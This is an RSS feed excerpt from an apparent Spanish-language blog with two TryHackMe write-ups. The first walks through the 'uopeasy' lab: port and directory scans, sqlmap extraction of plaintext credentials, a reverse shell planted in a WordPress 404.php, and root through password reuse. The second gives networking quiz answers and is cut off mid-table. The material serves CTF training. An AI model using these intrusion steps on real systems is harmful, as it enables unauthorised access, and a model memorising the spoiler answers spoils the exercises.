        <content:encoded>&lt;p&gt;uopeasy es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/uopeasy/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;uopeasy&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;360&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/ben&#34;&gt;ben&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), ldap (139) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Mon Jul  6 22:53:12 2020 as: nmap -sV -o nmap_scan_mini uopeasy.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; uopeasy.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.106.78&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.16s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.7 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
443/tcp  open  ssl/ssl Apache httpd &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSL-only mode&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
8080/tcp open  http    Apache httpd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Jul  6 22:53:55 2020 -- 1 IP address (1 host up) scanned in 43.52 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Mon Jul  6 22:53:19 2020 as: nmap -sV -p- -T5 -o nmap_scan uopeasy.thm&lt;/span&gt;
Warning: 10.10.106.78 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; uopeasy.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.106.78&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.18s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65530&lt;/span&gt; closed ports
PORT      STATE    SERVICE VERSION
80/tcp    open     http    Apache httpd 2.4.7 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
443/tcp   open     ssl/ssl Apache httpd &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSL-only mode&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
8080/tcp  open     http    Apache httpd
11930/tcp filtered unknown
48235/tcp filtered unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Jul  6 22:57:59 2020 -- 1 IP address (1 host up) scanned in 279.92 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/uopeasy/Screenshot_20200706_221019.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/uopeasy# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://uopeasy.thm/ -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/javascript &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/login.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/phpmyadmin &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;https&#34;&gt;HTTPS&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 443 con una url que redirecciona a wordpress. La pagina que aparece en este puerto es la misma que la del puerto 8080.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/uopeasy/Screenshot_20200706_221455.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/uopeasy/Screenshot_20200706_221700.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos gobuster nuevamente para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/uopeasy# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u https://uopeasy.thm/ -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt -k
/cgi-bin/.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/favicon.ico &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/img &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/wordpress &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;sqli-sqlmap&#34;&gt;SQLi SQLMAP&lt;/h2&gt;
&lt;p&gt;Capturamos los datos en la pagina &lt;code&gt;/login.php&lt;/code&gt; con burpsuite y utilizamos sqlmap para verificar si podemos realizar inyeccion sql.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/uopeasy/Screenshot_20200706_221828.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Lobramos obtener las bases de datos y al parecer utiliza una base de datos &lt;strong&gt;MySQL&lt;/strong&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;available databases &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;7&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; information_schema
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; login
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; mysql
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; performance_schema
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; phpmyadmin
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; users
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; wordpress8080

Database: login
Table: users
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; entries&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+----------+-----------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; password &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user_name &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----------+-----------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; password &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; candyshop &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; PopRocks &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Sir       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----------+-----------+

Database: wordpress8080
Table: users
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; entry&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+----------+---------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; username &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; password            &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----------+---------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; admin    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; S&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ... &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;d &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----------+---------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;daemon---user&#34;&gt;DAEMON - USER&lt;/h2&gt;
&lt;p&gt;Utilizamos las credenciales de la base de datos ingresar en wordpress.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/uopeasy/Screenshot_20200706_234047.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Editamos el archivo 404.php para agregar una shell inversa.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/uopeasy/Screenshot_20200706_235200.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener una shell con el usuario Deamon.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/uopeasy/Screenshot_20200706_235238.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion de archivos, y en el archivo &lt;code&gt;login.php&lt;/code&gt; encontramos nuevamente una contraseña, utilizamos esta con el usuario root y logramos obtener una shell con root.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/uopeasy/Screenshot_20200707_000103.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Las mismas credenciales para root nos permiten ingresar a &lt;code&gt;phpmyadmin&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/uopeasy/Screenshot_20200707_000923.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/uopeasy/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/uopeasy/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - BP: Networking</title>
        <link>https://sckull.github.io/posts/bpnetworking/</link>
        <pubDate>Sun, 28 Jun 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Sun, 28 Jun 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/bpnetworking/</guid>
        <description>BP: Networking es una serie de retos de TryHackMe.
 Informacion de la Maquina    Titulo BP: Networking     Info Part of the Blue Primer series, learn the basics of networking   Maker DarkStar7471    Kinda like a street address, just cooler.</description>
        <content:encoded>&lt;p&gt;BP: Networking es una serie de retos de TryHackMe.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/bpnetworking/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;BP: Networking&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Part of the Blue Primer series, learn the basics of networking&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/DarkStar7471&#34;&gt;DarkStar7471&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;kinda-like-a-street-address-just-cooler&#34;&gt;Kinda like a street address, just cooler.&lt;/h2&gt;
&lt;p&gt;Todas las computadoras tienen una direccion ip. Aca se definen los diferentes tipos de direcciones IP.&lt;/p&gt;
&lt;center&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/bpnetworking/1.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;/center&gt;
&lt;p&gt;&lt;strong&gt;Clases de direcciones IP&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Clase&lt;/th&gt;
&lt;th&gt;Rango&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Clase A&lt;/td&gt;
&lt;td&gt;1-127&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Clase B&lt;/td&gt;
&lt;td&gt;128-191&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Clase C&lt;/td&gt;
&lt;td&gt;192-223&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Clase D&lt;/td&gt;
&lt;td&gt;224-239&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Clase E&lt;/td&gt;
&lt;td&gt;240-255&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;Espacio de direcciones privadas&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Clase&lt;/th&gt;
&lt;th&gt;Rango&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Clase A&lt;/td&gt;
&lt;td&gt;10.0.0.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Clase B&lt;/td&gt;
&lt;td&gt;172.16.0.0 a 172.31.255.255&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Clase C&lt;/td&gt;
&lt;td&gt;192.168.0.0 a 192.168.255.255&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;div class=&#34;alert alert-danger&#34; role=&#34;alert&#34; data-dir=&#34;ltr&#34;&gt;&lt;strong&gt;SPOILER WARNING&lt;/strong&gt;&lt;/div&gt;

&lt;details&gt;
  &lt;summary&gt;RESPUESTAS - SPOILER WARNING&lt;/summary&gt;
&lt;p&gt;&lt;strong&gt;How many categories of IPv4 addresses are there?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;5 - Existen 5 clases de direcciones IP&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;*&lt;em&gt;Which type is for research? &lt;em&gt;Looking for a letter rather than a number here&lt;/em&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;E&lt;/code&gt; - &lt;a href=&#34;https://www.tutorialspoint.com/es/ipv4/ipv4_address_classes.htm&#34;&gt;&lt;em&gt;Esta clase IP está reservado para fines experimentales sólo para R&amp;amp;D o estudio.&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;How many private address ranges are there?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;3 - Existen 3 clases de direcciones IP Privadas&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Which private range is typically used by businesses?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;A - Clase privada&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;There are two common default private ranges for home routers, what is the first one?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;192.168.0.0 - Comunmente utilizada para routers de casa.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;How about the second common private home range?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;192.168.1.0- Comunmente utilizada para routers de casa.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;How many addresses make up a typical class C range? Specifically a /24&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;256&lt;/code&gt; - &lt;a href=&#34;http://jodies.de/ipcalc?host=192.168.0.0&amp;amp;mask1=24&amp;amp;mask2=255.255.255.0&#34;&gt;&lt;strong&gt;254 + 2 (reservadas)&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Of these addresses two are reserved, what is the first addresses typically reserved as?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;network&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;The very last address in a range is typically reserved as what address type?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;broadcast&lt;/code&gt; - &lt;a href=&#34;https://en.wikipedia.org/wiki/Broadcast_address#IP_networking&#34;&gt;**172.31.255.255 &lt;em&gt;Ejemplo&lt;/em&gt; **&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;A third predominant address type is typically reserved for the router, what is the name of this address type?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;gateway&lt;/code&gt; - &lt;a href=&#34;https://es.wikipedia.org/wiki/Puerta_de_enlace&#34;&gt;&lt;strong&gt;gateway&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Which address is reserved for testing on individual computers?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;127.0.0.1&lt;/code&gt; - &lt;a href=&#34;https://es.wikipedia.org/wiki/Localhost&#34;&gt;&lt;strong&gt;localhost&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;A particularly unique address is reserved for unroutable packets, what is that address? This can also refer to all IPv4 addresses on the local machine.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;0.0.0.0&lt;/code&gt; - &lt;a href=&#34;https://en.wikipedia.org/wiki/0.0.0.0#As_a_host_address&#34;&gt;&lt;strong&gt;0.0.0.0&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/details&gt;
&lt;h2 id=&#34;binary-to-decimal&#34;&gt;Binary to Decimal&lt;/h2&gt;
&lt;center&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/bpnetworking/Screenshot_20200629_020812.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;/center&gt;
&lt;p&gt;En esta parte debemos de realizar la conversion de binario a Decimal, para hacer esto utilizamos la siguiente tabla:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;128&lt;/th&gt;
&lt;th&gt;64&lt;/th&gt;
&lt;th&gt;32&lt;/th&gt;
&lt;th&gt;16&lt;/th&gt;
&lt;th&gt;8&lt;/th&gt;
&lt;th&gt;4&lt;/th&gt;
&lt;th&gt;2&lt;/th&gt;
&lt;th&gt;1&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;/table&gt;
&lt;p&gt;Para poder convertir de binario a decimal (utilizando la tabla) ordenamos los numeros (0&amp;rsquo;s y 1&amp;rsquo;s) de tal forma que queden ordenados con los valores de arriba. Si el numero es 1 tomamos el numero, si es 0, no.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;128&lt;/th&gt;
&lt;th&gt;64&lt;/th&gt;
&lt;th&gt;32&lt;/th&gt;
&lt;th&gt;16&lt;/th&gt;
&lt;th&gt;8&lt;/th&gt;
